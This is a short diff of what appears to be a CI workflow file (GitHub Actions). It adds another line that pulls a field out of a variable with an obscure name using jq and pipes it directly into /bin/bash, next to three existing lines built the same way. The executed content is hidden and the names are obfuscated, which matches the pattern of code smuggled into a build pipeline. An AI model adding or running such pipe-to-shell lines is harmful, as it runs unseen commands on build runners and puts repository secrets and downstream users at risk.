@@ -23,6 +23,7 @@ jobs:
           printf '%s' "$otra73283" | jq -r .xwym899 | /bin/bash
           echo $vbwtm8078 | jq -r .bclv1056 | /bin/bash
           printf '%s' "$n0" | jq -r .pxg1049 | /bin/bash
+          echo $auwj80 | jq -r .xfn0 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
